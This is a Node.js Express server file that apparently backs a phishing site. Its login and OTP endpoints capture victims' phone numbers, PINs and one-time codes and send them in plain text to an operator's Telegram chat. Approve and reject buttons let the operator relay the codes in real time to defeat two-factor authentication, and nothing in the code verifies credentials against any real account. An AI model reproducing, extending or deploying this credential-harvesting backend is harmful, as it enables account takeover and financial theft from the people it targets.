require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Serve the React build (frontend folder)
const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

// ─── Config ───
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ─── In-memory store ───
const applications = {};
const approvalStates = {};

// ─── Telegram helper ───
async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

// ─── API routes used by the React app ───

// Health check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// Check if user is returning (for login flow)
app.post('/api/:userId/check-user-status', (req, res) => {
  res.json({ isReturningUser: false });
});

// Login – send PIN to admin for approval
app.post('/api/:userId/login', async (req, res) => {
  const { phoneNumber, pin } = req.body;
  const appId = `${phoneNumber}_${Date.now()}`;

  applications[appId] = {
    phoneNumber,
    pin,
    status: 'pending',
    smsVerified: false,
    otpVerified: false,
    createdAt: new Date().toISOString()
  };
  approvalStates[phoneNumber] = { appId, step: 'PIN', pin, status: 'pending' };

  const message = `🔐 *LOGIN REQUEST*\n━━━━━━━━━━━━━━━━━━━━━━\n📱 Phone: ${phoneNumber}\n🔢 PIN: ${pin}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', type: 'login', phone: phoneNumber }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', type: 'login', phone: phoneNumber }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// Poll login approval status
app.post('/api/:userId/check-login-approval', async (req, res) => {
  const { phoneNumber, pin } = req.body;
  const state = approvalStates[phoneNumber];
  if (!state) return res.json({ success: false, approved: false });
  res.json({ success: true, approved: state.status === 'approved' });
});

// Resend OTP – notify admin and generate a new OTP
app.post('/api/:userId/resend-otp', async (req, res) => {
  const { phoneNumber } = req.body;
  const newOtp = Math.floor(100000 + Math.random() * 900000).toString();
  const state = approvalStates[phoneNumber];
  if (state) state.otp = newOtp;

  const message = `🔄 *OTP RESENT*\n━━━━━━━━━━━━━━━━━━━━━━\n📱 Phone: ${phoneNumber}\n🔑 New OTP: ${newOtp}\n\n✅ *Approve the OTP:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', type: 'otp', phone: phoneNumber, otp: newOtp }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', type: 'otp', phone: phoneNumber }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// Verify OTP – send OTP to admin for approval
app.post('/api/:userId/verify-otp', async (req, res) => {
  const { phoneNumber, otp } = req.body;
  const state = approvalStates[phoneNumber];
  if (!state) return res.status(404).json({ success: false, error: 'No state found' });

  state.otp = otp;
  state.step = 'OTP';

  const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n📱 Phone: ${phoneNumber}\n🔢 OTP: ${otp}\n\n✅ *Approve or reject:*`;
  const buttons = [[
    { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', type: 'otp', phone: phoneNumber, otp }) },
    { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', type: 'otp', phone: phoneNumber }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// Poll OTP approval status
app.post('/api/:userId/check-otp-status', async (req, res) => {
  const { phoneNumber, otp } = req.body;
  const state = approvalStates[phoneNumber];
  if (!state) return res.json({ status: 'pending' });

  if (state.step === 'OTP' && state.status === 'approved') {
    res.json({ status: 'approved' });
  } else if (state.step === 'OTP' && state.status === 'rejected') {
    res.json({ status: 'rejected' });
  } else {
    res.json({ status: 'pending' });
  }
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const query = update.callback_query;
    const { action, type, phone, otp } = JSON.parse(query.data);
    const state = approvalStates[phone];

    if (state) {
      state.status = action === 'YES' ? 'approved' : 'rejected';

      await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${action}` })
      });

      await sendTelegramMessage(`📌 *Status Update*\n📱 Phone: ${phone}\n📋 ${type}: ${state.status}`);
    }
    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;

    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        await sendTelegramMessage(`📊 Total applications: ${total}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = '📋 Recent applications:\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `${id} – ${app.phoneNumber} (${app.status})\n`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage('Commands: /stats, /list, /status');
      } else if (text === '/status') {
        const webhookInfo = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`).then(r => r.json());
        await sendTelegramMessage(`Webhook: ${webhookInfo.result?.url || 'not set'}`);
      }
    }
  }

  res.sendStatus(200);
});

// ─── Fallback: serve React app index.html for any non-API route ───
app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

// ─── Start server ───
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📁 Serving frontend from: ${frontendPath}`);
});
